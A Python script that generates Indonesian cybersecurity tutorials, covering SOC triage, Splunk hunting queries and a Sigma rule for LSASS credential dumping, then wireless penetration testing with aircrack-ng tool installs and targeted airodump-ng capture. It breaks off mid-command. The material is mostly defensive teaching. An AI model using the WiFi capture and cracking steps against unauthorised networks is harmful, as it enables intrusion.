#!/usr/bin/env python3
"""Generate 9 cybersecurity tutorial articles for BeebaneLabs."""

import os

OUTPUT_DIR = r"C:\Users\user\Documents\pribadi\web adsence\articles"

articles = [
    {
        "filename": "soc-operations.html",
        "title": "SOC Operations dan Incident Triage",
        "meta_desc": "Pelajari SOC Operations dan Incident Triage: struktur tim SOC, workflow monitoring, triage framework, alert prioritization, dan incident response.",
        "keywords": "SOC Operations, Incident Triage, Security Operations Center, Alert Prioritization, Incident Response",
        "difficulty": "menengah",
        "difficulty_label": "Menengah",
        "time": "15 menit",
        "subtitle": "Panduan lengkap membangun dan mengoperasikan Security Operations Center — dari struktur tim, monitoring workflow, triage framework, hingga incident response",
        "toc": [
            ("pengenalan", "Pengenalan SOC"),
            ("struktur-tim", "Struktur Tim SOC"),
            ("workflow", "SOC Monitoring Workflow"),
            ("triage", "Incident Triage Framework"),
            ("alert-prioritization", "Alert Prioritization"),
            ("siem-integration", "SIEM Integration"),
            ("incident-response", "Incident Response"),
            ("metrics", "SOC Metrics & KPI"),
            ("automation", "SOAR & Automation"),
            ("quiz", "Quiz Pemahaman"),
        ],
        "sections": [
            ('''      <h2 id="pengenalan">1. Pengenalan Security Operations Center</h2>
      <p><strong>Security Operations Center (SOC)</strong> adalah pusat komando keamanan siber yang beroperasi 24/7 untuk memantau, mendeteksi, menganalisis, dan merespons insiden keamanan secara real-time. SOC menjadi garda terdepan pertahanan organisasi terhadap serangan siber yang semakin canggih.</p>

      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div>
        <ul>
          <li>Struktur dan fungsi tim SOC</li>
          <li>Workflow monitoring dan alerting</li>
          <li>Incident triage dan prioritisasi</li>
          <li>Integration dengan SIEM tools</li>
          <li>Incident response dan remediation</li>
          <li>SOAR dan automasi proses</li>
        </ul>
      </div>

      <h3>Mengapa SOC Penting?</h3>
      <p>Di era di mana serangan siber terjadi setiap 39 detik, memiliki SOC yang efektif bukan lagi kemewahan tetapi kebutuhan. SOC memungkinkan organisasi untuk:</p>
      <ul>
        <li><strong>Deteksi dini</strong> — Mengidentifikasi ancaman sebelum menyebabkan kerusakan signifikan</li>
        <li><strong>Response cepat</strong> — Merespons insiden dalam hitungan menit, bukan hari</li>
        <li><strong>Compliance</strong> — Memenuhi persyaratan regulasi seperti PCI DSS, HIPAA, dan ISO 27001</li>
        <li><strong>Visibility</strong> — Memiliki gambaran lengkap atas postur keamanan organisasi</li>
      </ul>

      <div class="diagram-box"><div class="diagram-label">Diagram: SOC Maturity Model</div>
<pre>
┌─────────────────────────────────────────────────────────────┐
│                    SOC MATURITY LEVELS                        │
│                                                              │
│  Level 1: Perimeter Security                                 │
│  ├── Firewall, IDS/IPS                                       │
│  └── Basic log monitoring                                    │
│                                                              │
│  Level 2: Log Management & SIEM                              │
│  ├── Centralized logging                                     │
│  ├── SIEM deployment                                         │
│  └── Basic correlation rules                                 │
│                                                              │
│  Level 3: Threat Detection & Response                        │
│  ├── Advanced analytics                                      │
│  ├── Threat intelligence integration                         │
│  └── Incident response procedures                            │
│                                                              │
│  Level 4: Proactive Hunting                                  │
│  ├── Threat hunting teams                                    │
│  ├── Red team exercises                                      │
│  └── Behavioral analytics                                    │
│                                                              │
│  Level 5: Adaptive & Autonomous                              │
│  ├── AI/ML-powered detection                                 │
│  ├── Automated response (SOAR)                               │
│  └── Continuous improvement                                  │
└─────────────────────────────────────────────────────────────┘
</pre>
      </div>
'''),
            ('''      <h2 id="struktur-tim">2. Struktur Tim SOC</h2>
      <p>Tim SOC terdiri dari beberapa level analis dengan tanggung jawab yang berbeda. Struktur tiered model memastikan insiden ditangani oleh personel dengan keahlian yang sesuai.</p>

      <table class="net-table"><thead><tr><th>Level</th><th>Peran</th><th>Tanggung Jawab</th></tr></thead><tbody>
        <tr><td><strong>Tier 1 — L1</strong></td><td>Triage Analyst</td><td>Monitoring alert, filter false positive, eskalasi insiden</td></tr>
        <tr><td><strong>Tier 2 — L2</strong></td><td>Incident Responder</td><td>Analisis mendalam, investigasi, containment</td></tr>
        <tr><td><strong>Tier 3 — L3</strong></td><td>Threat Hunter</td><td>Proactive hunting, malware analysis, forensik</td></tr>
        <tr><td><strong>Tier 4</strong></td><td>SOC Manager</td><td>Manajemen tim, reporting, strategi keamanan</td></tr>
      </tbody></table>

      <h3>Tier 1 — Triage Analyst</h3>
      <p>Analyst L1 adalah lini pertama pertahanan. Mereka bertugas memantau dashboard SIEM, melakukan triage terhadap alert yang masuk, dan memutuskan apakah sebuah alert perlu diekskalasi ke L2. Kemampuan yang dibutuhkan meliputi pemahaman dasar networking, OS, dan keamanan siber.</p>

      <div class="code-block"><div class="code-header"><span class="code-lang">Triage Checklist — Tier 1</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Checklist Triage Alert — Tier 1 Analyst
# =============================================

# 1. Verifikasi Alert
#    - Apakah alert valid atau false positive?
#    - Apakah ada konteks tambahan di log?
#    - Apakah ada korelasi dengan alert lain?

# 2. Enrichment Data
#    - Cek IP address di threat intelligence
#    - Verifikasi user yang terlibat
#    - Cek aset yang terdampak

# Contoh: Mengecek IP di abuse.ch
curl -s "https://threatfox-api.abuse.ch/api/v1/" \\
  -d '{"query": "search_ioc", "search_term": "192.168.1.100"}'

# Contoh: Lookup domain di VirusTotal
curl --request GET \\
  --url "https://www.virustotal.com/api/v3/domains/malicious.com" \\
  --header "x-apikey: YOUR_API_KEY"

# 3. Klasifikasi Severity
#    - Critical: Active exploitation, data breach
#    - High: Successful unauthorized access
#    - Medium: Suspicious activity, policy violation
#    - Low: Informational, reconnaissance

# 4. Dokumentasi & Eskalasi
#    - Isi template insiden
#    - Attach semua evidence
#    - Eskalasi ke L2 jika severity >= Medium</pre>
      </div>

      <h3>Tier 2 — Incident Responder</h3>
      <p>Analyst L2 melakukan investigasi mendalam terhadap insiden yang diekskalasi dari L1. Mereka bertugas menentukan root cause, melakukan containment, dan mengoordinasikan eradication.</p>

      <div class="code-block"><div class="code-header"><span class="code-lang">Splunk — Investigasi Lateral Movement</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# SPL Query: Mencari Lateral Movement
# =============================================

# Cari anomali login dari satu host ke banyak host
index=windows sourcetype=WinEventLog:Security EventCode=4624
| stats dc(ComputerName) as target_count,
        values(ComputerName) as targets,
        count as login_count
  by Account_Name, IpAddress
| where target_count > 5
| sort - target_count

# Cari penggunaan PsExec atau WMI lateral movement
index=windows sourcetype=WinEventLog:Security
  (EventCode=4624 OR EventCode=7045)
| eval method=case(
    EventCode=4624 AND Logon_Type=3, "Network Logon",
    EventCode=7045, "Service Install"
  )
| where isnotnull(method)
| stats count by Account_Name, ComputerName, method

# Cari SMB file share access anomali
index=windows sourcetype=WinEventLog:Security EventCode=5140
| stats dc(Share_Name) as share_count,
        values(Share_Name) as shares
  by Account_Name
| where share_count > 10</pre>
      </div>
'''),
            ('''      <h2 id="workflow">3. SOC Monitoring Workflow</h2>
      <p>Workflow SOC yang efektif mengikuti siklus berulang: <strong>Detect → Triage → Investigate → Respond → Recover → Lessons Learned</strong>. Setiap tahap memiliki prosedur dan tools yang terstandarisasi.</p>

      <h3>Data Sources yang Dimonitor</h3>
      <p>SOC memantau berbagai sumber data untuk mendapatkan visibilitas menyeluruh terhadap ancaman:</p>
      <ul>
        <li><strong>Network Logs</strong> — Firewall, router, switch, IDS/IPS</li>
        <li><strong>Endpoint Logs</strong> — EDR, antivirus, OS event logs</li>
        <li><strong>Application Logs</strong> — Web server, database, authentication</li>
        <li><strong>Cloud Logs</strong> — AWS CloudTrail, Azure Activity Log, GCP Audit</li>
        <li><strong>Email Logs</strong> — Email gateway, anti-spam, DMARC reports</li>
        <li><strong>Identity Logs</strong> — Active Directory, LDAP, SSO, MFA</li>
      </ul>

      <div class="warning-box"><div class="info-box-title">⚠️ Peringatan</div>
        <p>Jangan mengandalkan satu sumber data saja. Serangan modern sering kali meninggalkan jejak di multiple log sources. Kumpulkan dan korelasikan data dari setidaknya 5-6 sumber berbeda untuk deteksi yang optimal.</p>
      </div>

      <h3>Shift Handover Procedure</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Template — Shift Handover</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Template: SOC Shift Handover
# =============================================

# Tanggal & Waktu: 2024-01-15 08:00 WIB
# Shift Sebelumnya: Night Shift (00:00 - 08:00)
# Analis: John Doe

# RINGKASAN SHIFT
# =================================================
# Total Alert Masuk: 342
# Alert Dismissed (FP): 298
# Alert Open (menunggu investigasi): 38
# Insiden Dikonfirmasi: 6

# INSIDEN AKTIF (belum resolved)
# =================================================
# INC-2024-0142: Brute force SSH dari 203.0.113.50
#   Status: Under investigation (L2)
#   Aksi: IP sudah di-block di firewall
#   Next: Cek apakah ada kompromi lain

# INC-2024-0145: Data exfiltration indicator
#   Status: Containment done, eradication pending
#   Aksi: Host WS-FINANCE-05 diisolasi dari network
#   Next: Full disk imaging dan malware analysis

# ALERT MENINGKAT (dari shift sebelumnya)
# =================================================
# Phishing email meningkat 300% — campaign baru
# Brute force ke VPN portal dari 3 IP berbeda
# Unusual DNS queries dari server HR

# ACTION ITEMS UNTUK SHIFT BERIKUTNYA
# =================================================
# 1. Follow up INC-2024-0142 dan 0145
# 2. Monitor phishing campaign — update email rules
# 3. Review VPN access logs 24 jam terakhir
# 4. Update threat intel feeds</pre>
      </div>
'''),
            ('''      <h2 id="triage">4. Incident Triage Framework</h2>
      <p>Triage adalah proses memutuskan prioritas dan urgensi sebuah alert. Framework yang baik mengurangi waktu respon dan memastikan sumber daya SOC teralokasi dengan tepat.</p>

      <h3>Severity Matrix</h3>
      <table class="net-table"><thead><tr><th>Severity</th><th>Dampak</th><th>Response Time</th><th>Contoh</th></tr></thead><tbody>
        <tr><td><strong>Critical (P1)</strong></td><td>Bisnis terhenti, data breach</td><td>&lt; 15 menit</td><td>Active ransomware, data exfiltration</td></tr>
        <tr><td><strong>High (P2)</strong></td><td>Dampak signifikan</td><td>&lt; 1 jam</td><td>Unauthorized admin access, malware execution</td></tr>
        <tr><td><strong>Medium (P3)</strong></td><td>Potensi risiko</td><td>&lt; 4 jam</td><td>Suspicious process, policy violation</td></tr>
        <tr><td><strong>Low (P4)</strong></td><td>Informatif</td><td>&lt; 24 jam</td><td>Failed login attempt, port scan</td></tr>
      </tbody></table>

      <h3>Triage Decision Tree</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: Triage Decision Tree</div>
<pre>
┌───────────────────────────────────────┐
│         ALERT MASUK                    │
└─────────────┬─────────────────────────┘
              ▼
┌───────────────────────────────────────┐
│  Apakah ini FALSE POSITIVE?            │
│  (known benign activity, scheduled     │
│   scan, maintenance window)            │
└──────┬────────────────┬───────────────┘
       ▼ YES            ▼ NO
┌──────────────┐  ┌─────────────────────┐
│  Dismiss &   │  │  Apakah target ASET │
│  Document    │  │  KRITIS?             │
│              │  │  (DC, DB, Finance)   │
└──────────────┘  └──┬───────────┬──────┘
                     ▼ YES       ▼ NO
              ┌────────────┐ ┌─────────────┐
              │  P1/P2     │ │  Apakah ada │
              │  Immediate │ │  KOMPROMI?  │
              │  Response  │ │  (exec, C2) │
              └────────────┘ └──┬──────┬───┘
                               ▼ YES  ▼ NO
                        ┌──────────┐ ┌───────┐
                        │  P2      │ │  P3/P4│
                        │  Escalate│ │  Log &│
                        │  to L2   │ │  Track│
                        └──────────┘ └───────┘
</pre>
      </div>

      <h3>Contoh Triage Alert</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">SIEM Alert — Brute Force Detection</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Contoh Alert: Brute Force Detection
# =============================================

# Alert Details:
# Name: Multiple Failed Login Attempts
# Source: Active Directory
# Timestamp: 2024-01-15 03:22:45 WIB
# Count: 47 failed attempts in 5 minutes
# Target: DC-FINANCE-01 (Domain Controller)
# Source IP: 10.10.50.23 (Workstation HR)
# Account: administrator

# TRIAGE ANALYSIS
# =================================================

# Step 1: Verify alert validity
# - Check if IP belongs to legitimate scanner
# - Verify with asset inventory
# - Check if there's a maintenance window

# Step 2: Context enrichment
# - User "administrator" is a sensitive account
# - DC-FINANCE-01 is a critical asset
# - Source workstation belongs to HR department
# - Time 03:22 is outside business hours

# Step 3: Severity determination
# - Target: Critical (Domain Controller)
# - Account: Critical (administrator)
# - Time: Suspicious (after hours)
# - Volume: High (47 attempts)
# => SEVERITY: P1 — CRITICAL

# Step 4: Immediate actions
# 1. Block source IP at firewall
netsh advfirewall firewall add rule name="BLOCK-BF-001" \\
  dir=in action=block remoteip=10.10.50.23

# 2. Disable compromised account
net user administrator /active:no

# 3. Check for successful login
# Query: Did any login succeed from this IP?
index=windows EventCode=4624 IpAddress="10.10.50.23"
  Account_Name="administrator"

# 4. Isolate affected workstation
# (via EDR or network segmentation)</pre>
      </div>
'''),
            ('''      <h2 id="alert-prioritization">5. Alert Prioritization</h2>
      <p>Alert fatigue adalah salah satu tantangan terbesar SOC. Rata-rata SOC menerima 11,000 alert per hari, dan hanya 1-5% yang benar-benar memerlukan investigasi. Prioritisasi yang tepat sangat krusial.</p>

      <h3>Strategi Mengurangi Alert Fatigue</h3>
      <ul>
        <li><strong>Tune correlation rules</strong> — Hapus atau modifikasi rule yang menghasilkan terlalu banyak false positive</li>
        <li><strong>Whitelist known good</strong> — Identifikasi dan whitelist aktivitas benign yang berulang</li>
        <li><strong>Context enrichment</strong> — Tambahkan konteks seperti asset criticality, user role, dan threat intel</li>
        <li><strong>Risk scoring</strong> — Hitung risk score berdasarkan multiple faktor</li>
      </ul>

      <div class="code-block"><div class="code-header"><span class="code-lang">Python — Risk Scoring Engine</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Risk Scoring Engine untuk Alert Prioritization
# =============================================

class AlertRiskScorer:
    def __init__(self):
        self.asset_weights = {
            "domain_controller": 10,
            "database_server": 9,
            "web_server": 7,
            "workstation": 4,
            "printer": 1
        }
        self.threat_intel_multiplier = 1.5
        self.time_multiplier = {
            "business_hours": 1.0,
            "after_hours": 1.3,
            "holiday": 1.5
        }

    def calculate_score(self, alert):
        base_score = 0

        # Factor 1: Asset Criticality (0-30)
        asset_type = alert.get("asset_type", "workstation")
        base_score += self.asset_weights.get(asset_type, 4) * 3

        # Factor 2: Threat Intel Match (0-25)
        if alert.get("threat_intel_match"):
            base_score += 25

        # Factor 3: Attack Confidence (0-20)
        confidence = alert.get("confidence", 0.5)
        base_score += int(confidence * 20)

        # Factor 4: User Risk (0-15)
        if alert.get("privileged_user"):
            base_score += 15
        elif alert.get("executive_user"):
            base_score += 12
        else:
            base_score += 5

        # Factor 5: Time-based (multiplier)
        time_factor = self.time_multiplier.get(
            alert.get("time_category"), 1.0
        )
        base_score = int(base_score * time_factor)

        # Clamp to 0-100
        return min(max(base_score, 0), 100)

    def get_priority(self, score):
        if score >= 80: return "P1 — Critical"
        if score >= 60: return "P2 — High"
        if score >= 40: return "P3 — Medium"
        return "P4 — Low"

# Contoh penggunaan
scorer = AlertRiskScorer()
alert = {
    "asset_type": "domain_controller",
    "threat_intel_match": True,
    "confidence": 0.85,
    "privileged_user": True,
    "time_category": "after_hours"
}
score = scorer.calculate_score(alert)
priority = scorer.get_priority(score)
print(f"Risk Score: {score}/100 — {priority}")
# Output: Risk Score: 97/100 — P1 — Critical</pre>
      </div>
'''),
            ('''      <h2 id="siem-integration">6. SIEM Integration</h2>
      <p>SIEM (Security Information and Event Management) adalah jantung dari operasi SOC. Integrasi yang baik antara sumber data dan SIEM memastikan deteksi yang komprehensif.</p>

      <h3>SIEM Deployment Architecture</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: SIEM Architecture</div>
<pre>
┌─────────────────────────────────────────────────────────┐
│              SIEM ARCHITECTURE                            │
│                                                          │
│  Data Sources          Collection          Analysis      │
│  ┌──────────┐         ┌──────────┐       ┌──────────┐  │
│  │ Firewall  │────────▶│          │       │Correlation│  │
│  │ IDS/IPS   │────────▶│  Log     │       │  Engine   │  │
│  │ Endpoint  │────────▶│ Collector│──────▶│          │  │
│  │ WAF       │────────▶│  /Agent  │       │  Rules    │  │
│  │ VPN       │────────▶│          │       │  ML Model │  │
│  │ AD/LDAP   │────────▶└──────────┘       └─────┬────┘  │
│  │ Cloud     │                                   │       │
│  └──────────┘                              ┌─────▼────┐  │
│                                            │ Alerting  │  │
│                                            │ & Dashboard│ │
│                                            └─────┬────┘  │
│                                                  │       │
│                                            ┌─────▼────┐  │
│                                            │  SOC Team │  │
│                                            │  Response │  │
│                                            └──────────┘  │
└─────────────────────────────────────────────────────────┘
</pre>
      </div>

      <h3>Contoh Correlation Rule</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Sigma Rule — Credential Dumping</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Sigma Rule: Credential Dumping Detection
# =============================================
title: Credential Dumping via LSASS Access
id: a1234567-89ab-cdef-0123-456789abcdef
status: production
description: >
  Detects suspicious access to LSASS process
  which may indicate credential dumping tools
  like Mimikatz, Pypykatz, or similar.

logsource:
  category: process_access
  product: windows

detection:
  selection:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'    # PROCESS_QUERY_LIMITED + VM_READ
      - '0x1410'    # + PROCESS_VM_OPERATION
      - '0x1438'    # Full access flags
  filter:
    SourceImage|endswith:
      - '\\wmiprvse.exe'
      - '\\taskmgr.exe'
      - '\\procexp.exe'
  condition: selection and not filter

falsepositives:
  - Legitimate security tools
  - System processes

level: high
tags:
  - attack.credential_access
  - attack.t1003.001</pre>
      </div>
'''),
            ('''      <h2 id="incident-response">7. Incident Response</h2>
      <p>Incident Response (IR) adalah proses terstruktur untuk menangani insiden keamanan. Framework NIST SP 800-61 mendefinisikan 4 fase utama: <strong>Preparation, Detection & Analysis, Containment Eradication Recovery, dan Post-Incident Activity</strong>.</p>

      <h3>Incident Response Playbook — Ransomware</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">IR Playbook — Ransomware</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# INCIDENT RESPONSE PLAYBOOK: RANSOMWARE
# =============================================

# PHASE 1: DETECTION & TRIAGE (0-30 menit)
# =================================================
# 1. Identifikasi indikator ransomware:
#    - Mass file extension changes
#    - Ransom note files appearing
#    - Unusual process execution
#    - Volume shadow copy deletion
#    - High CPU/disk I/O

# 2. Validasi alert:
#    - Verify file encryption evidence
#    - Check for ransom note content
#    - Identify ransomware variant (use ID Ransomware)

# 3. Severity: P1 — CRITICAL

# PHASE 2: CONTAINMENT (30 menit - 2 jam)
# =================================================
# 1. Network isolation:
#    - Disconnect affected hosts from network
#    - Block lateral movement paths
#    - Isolate network segments

# 2. Account security:
#    - Force password reset for compromised accounts
#    - Disable suspicious service accounts
#    - Review and revoke VPN access

# 3. Evidence preservation:
#    - Capture memory dump
#    - Image affected systems
#    - Collect logs from all sources
#    - Document timeline

# PHASE 3: ERADICATION (2-24 jam)
# =================================================
# 1. Malware removal:
#    - Identify all affected systems
#    - Remove malware artifacts
#    - Patch exploited vulnerabilities

# 2. Root cause analysis:
#    - Initial infection vector
#    - Privilege escalation path
#    - Lateral movement methods

# PHASE 4: RECOVERY (1-7 hari)
# =================================================
# 1. System restoration:
#    - Restore from clean backups
#    - Verify system integrity
#    - Rebuild compromised systems

# 2. Monitoring:
#    - Enhanced monitoring for 30 days
#    - Watch for re-infection indicators

# PHASE 5: LESSONS LEARNED (7-14 hari)
# =================================================
# 1. Post-incident review meeting
# 2. Update detection rules
# 3. Improve security controls
# 4. Update this playbook</pre>
      </div>
'''),
            ('''      <h2 id="metrics">8. SOC Metrics & KPI</h2>
      <p>Mengukur kinerja SOC sangat penting untuk perbaikan berkelanjutan dan membuktikan nilai investasi keamanan kepada manajemen.</p>

      <h3>Key Performance Indicators</h3>
      <table class="net-table"><thead><tr><th>KPI</th><th>Deskripsi</th><th>Target</th></tr></thead><tbody>
        <tr><td><strong>MTTD</strong></td><td>Mean Time to Detect</td><td>&lt; 1 jam</td></tr>
        <tr><td><strong>MTTR</strong></td><td>Mean Time to Respond</td><td>&lt; 4 jam</td></tr>
        <tr><td><strong>MTTC</strong></td><td>Mean Time to Contain</td><td>&lt; 8 jam</td></tr>
        <tr><td><strong>False Positive Rate</strong></td><td>% alert yang ternyata FP</td><td>&lt; 50%</td></tr>
        <tr><td><strong>Coverage</strong></td><td>% MITRE ATT&CK yang termonitor</td><td>&gt; 70%</td></tr>
        <tr><td><strong>Alert Volume</strong></td><td>Jumlah alert per hari</td><td>Trending stabil/menurun</td></tr>
        <tr><td><strong>Escalation Rate</strong></td><td>% alert yang perlu eskalasi</td><td>5-15%</td></tr>
      </tbody></table>

      <div class="info-box info"><div class="info-box-title">💡 Tips</div>
        <p>Fokus pada MTTD dan MTTR sebagai metrik utama. Kedua metrik ini langsung menggambarkan efektivitas SOC dalam mendeteksi dan merespons ancaman. Targetkan improvement 10-20% setiap quarter.</p>
      </div>
'''),
            ('''      <h2 id="automation">9. SOAR & Automation</h2>
      <p><strong>SOAR (Security Orchestration, Automation, and Response)</strong> memungkinkan SOC mengotomasi tugas-tugas repetitif sehingga analis dapat fokus pada analisis tingkat tinggi.</p>

      <h3>Playbook Automation Example</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Python — SOAR Playbook Skeleton</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# SOAR Playbook: Automated Phishing Response
# =============================================

class PhishingPlaybook:
    def __init__(self, siem_client, email_client, edr_client):
        self.siem = siem_client
        self.email = email_client
        self.edr = edr_client

    def execute(self, alert):
        """Main playbook execution flow."""

        # Step 1: Extract IOCs from phishing email
        iocs = self.extract_iocs(alert["email_data"])
        print(f"[*] Extracted IOCs: {iocs}")

        # Step 2: Enrich with threat intelligence
        ti_results = self.threat_intel_lookup(iocs)
        malicious_score = ti_results.get("score", 0)

        if malicious_score > 70:
            # Step 3a: High confidence — auto remediate
            self.quarantine_email(alert["message_id"])
            self.block_sender(alert["sender"])
            self.block_urls(iocs["urls"])

            # Step 4: Check if anyone clicked the link
            affected_users = self.check_url_clicks(iocs["urls"])
            if affected_users:
                self.isolate_endpoints(affected_users)
                self.reset_passwords(affected_users)
                self.notify_users(affected_users)

            return {"action": "auto_remediated",
                    "affected_users": affected_users}
        else:
            # Step 3b: Low confidence — escalate to analyst
            self.create_ticket(alert, ti_results)
            return {"action": "escalated_to_analyst",
                    "threat_score": malicious_score}

    def extract_iocs(self, email_data):
        import re
        urls = re.findall(
            r'https?://[^\\s<>"]+', email_data.get("body", "")
        )
        return {
            "sender": email_data.get("from"),
            "subject": email_data.get("subject"),
            "urls": urls,
            "attachments": email_data.get("attachments", [])
        }

    def threat_intel_lookup(self, iocs):
        # Query multiple TI sources
        results = {"score": 0}
        for url in iocs.get("urls", []):
            # Check URLhaus, VirusTotal, PhishTank
            pass
        return results</pre>
      </div>

      <div class="warning-box"><div class="info-box-title">⚠️ Catatan Penting</div>
        <p>Otomasi tidak menggantikan analis manusia. Selalu gunakan human-in-the-loop untuk keputusan high-impact seperti isolasi sistem produksi atau blocking IP range. Otomasi terbaik adalah untuk enrichment, ticketing, dan remediation low-risk.</p>
      </div>
'''),
        ],
        "quiz": [
            {
                "q": "1. Apa tanggung jawab utama Tier 1 (L1) analyst di SOC?",
                "options": [
                    "Malware reverse engineering",
                    "Monitoring alert, filter false positive, eskalasi insiden",
                    "Mengelola tim SOC",
                    "Melakukan red team exercise",
                ],
                "correct": "1",
            },
            {
                "q": "2. Berapa response time target untuk insiden severity P1 (Critical)?",
                "options": [
                    "&lt; 24 jam",
                    "&lt; 4 jam",
                    "&lt; 1 jam",
                    "&lt; 15 menit",
                ],
                "correct": "3",
            },
            {
                "q": "3. Apa kepanjangan dari MTTD dalam SOC metrics?",
                "options": [
                    "Mean Time to Deploy",
                    "Mean Time to Detect",
                    "Mean Time to Debug",
                    "Mean Time to Delete",
                ],
                "correct": "1",
            },
            {
                "q": "4. Tool apa yang digunakan untuk mengotomasi playbook keamanan?",
                "options": [
                    "SIEM",
                    "IDS/IPS",
                    "SOAR",
                    "Firewall",
                ],
                "correct": "2",
            },
            {
                "q": "5. Dalam incident response, apa langkah pertama setelah mendeteksi ransomware?",
                "options": [
                    "Langsung membayar ransom",
                    "Melakukan containment — isolasi host dari network",
                    "Menghapus semua log",
                    "Restart semua server",
                ],
                "correct": "1",
            },
        ],
    },
    {
        "filename": "wireless-penetration-testing.html",
        "title": "Wireless Penetration Testing",
        "meta_desc": "Pelajari wireless penetration testing: WiFi security assessment, WPA/WPA2/WPA3 cracking, rogue AP detection, dan wireless exploitation techniques.",
        "keywords": "Wireless Penetration Testing, WiFi Security, WPA2 Cracking, Aircrack-ng, Rogue AP",
        "difficulty": "lanjut",
        "difficulty_label": "Lanjut",
        "time": "16 menit",
        "subtitle": "Panduan lengkap wireless penetration testing — dari reconnaissance, WiFi cracking, rogue AP, Evil Twin, hingga wireless IDS/IPS",
        "toc": [
            ("pengenalan", "Pengenalan Wireless Pentest"),
            ("tools-setup", "Tools dan Setup"),
            ("recon", "Wireless Reconnaissance"),
            ("wep-cracking", "WEP Cracking"),
            ("wpa-cracking", "WPA/WPA2 Cracking"),
            ("wpa3", "WPA3 Security"),
            ("evil-twin", "Evil Twin & Karma Attack"),
            ("reporting", "Reporting & Remediation"),
            ("quiz", "Quiz Pemahaman"),
        ],
        "sections": [
            ('''      <h2 id="pengenalan">1. Pengenalan Wireless Penetration Testing</h2>
      <p><strong>Wireless Penetration Testing</strong> adalah proses evaluasi keamanan jaringan nirkabel untuk mengidentifikasi kerentanan, konfigurasi yang salah, dan potensi eksploitasi. Berbeda dengan wired network, wireless network dapat diakses dari jarak tertentu tanpa koneksi fisik, membuatnya lebih rentan terhadap serangan.</p>

      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div>
        <ul>
          <li>Wireless security protocols (WEP, WPA, WPA2, WPA3)</li>
          <li>WiFi reconnaissance dan scanning</li>
          <li>Password cracking techniques</li>
          <li>Evil Twin dan rogue AP attacks</li>
          <li>Wireless IDS/IPS deployment</li>
          <li>Remediation dan hardening</li>
        </ul>
      </div>

      <h3>Wireless Security Protocol Evolution</h3>
      <table class="net-table"><thead><tr><th>Protocol</th><th>Year</th><th>Encryption</th><th>Status</th></tr></thead><tbody>
        <tr><td><strong>WEP</strong></td><td>1999</td><td>RC4 (24-bit IV)</td><td>Broken — Jangan digunakan</td></tr>
        <tr><td><strong>WPA</strong></td><td>2003</td><td>TKIP/RC4</td><td>Deprecated</td></tr>
        <tr><td><strong>WPA2</strong></td><td>2004</td><td>AES-CCMP</td><td>Standar saat ini</td></tr>
        <tr><td><strong>WPA3</strong></td><td>2018</td><td>SAE/AES-GCMP</td><td>Rekomendasi</td></tr>
      </tbody></table>
'''),
            ('''      <h2 id="tools-setup">2. Tools dan Setup</h2>
      <p>Untuk melakukan wireless penetration testing, Anda memerlukan hardware dan software yang sesuai. Pastikan Anda memiliki izin tertulis sebelum melakukan testing pada jaringan orang lain.</p>

      <h3>Hardware Requirements</h3>
      <ul>
        <li><strong>Wireless adapter</strong> yang mendukung monitor mode dan packet injection (contoh: Alfa AWUS036ACH, Alfa AWUS1900)</li>
        <li><strong>External antenna</strong> untuk meningkatkan jangkauan (omni-directional dan directional)</li>
        <li><strong>Laptop</strong> dengan Kali Linux atau Parrot OS</li>
      </ul>

      <h3>Software Tools</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Install Wireless Testing Tools</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Installasi Tools Wireless Pentesting di Kali Linux
# =============================================

# Update system
sudo apt update && sudo apt upgrade -y

# Install Aircrack-ng suite
sudo apt install -y aircrack-ng

# Install additional wireless tools
sudo apt install -y \\
  hostapd \\
  dnsmasq \\
  reaver \\
  wifite \\
  bully \\
  pixiewps \\
  mdk3 \\
  mdk4 \\
  hashcat \\
  hcxdumptool \\
  hcxpcapngtool \\
  kismet \\
  wireshark \\
  fern-wifi-cracker

# Verifikasi wireless adapter
iwconfig

# Cek apakah adapter mendukung monitor mode
airmon-ng

# Enable monitor mode
sudo airmon-ng start wlan0

# Verifikasi monitor mode
iwconfig wlan0mon

# Cek adapter capabilities
iw list | grep -A 8 "Supported interface modes"</pre>
      </div>

      <h3>Legal Considerations</h3>
      <div class="warning-box"><div class="info-box-title">⚠️ Peringatan Hukum</div>
        <p>Wireless penetration testing HANYA boleh dilakukan pada jaringan yang Anda miliki atau yang memiliki izin tertulis (authorization letter) dari pemilik. Mengakses jaringan tanpa izin adalah pelanggaran hukum di Indonesia berdasarkan UU ITE Pasal 30-32.</p>
      </div>
'''),
            ('''      <h2 id="recon">3. Wireless Reconnaissance</h2>
      <p>Reconnaissance adalah langkah pertama dalam wireless pentest. Tujuannya adalah mengidentifikasi semua wireless network, clients, dan konfigurasi dalam range.</p>

      <h3>Passive Scanning</h3>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — WiFi Reconnaissance</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
# Wireless Reconnaissance dengan Aircrack-ng
# =============================================

# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Scan semua channel (passive)
sudo airodump-ng wlan0mon \\
  --band abg \\
  --write scan_results \\
  --output-format pcap,csv

# 3. Focus pada target network
sudo airodump-ng wlan0mon \\
  --bssid AA:BB:CC:DD:EE:FF \\
  --channel 6 \\
  --write target_capture \\
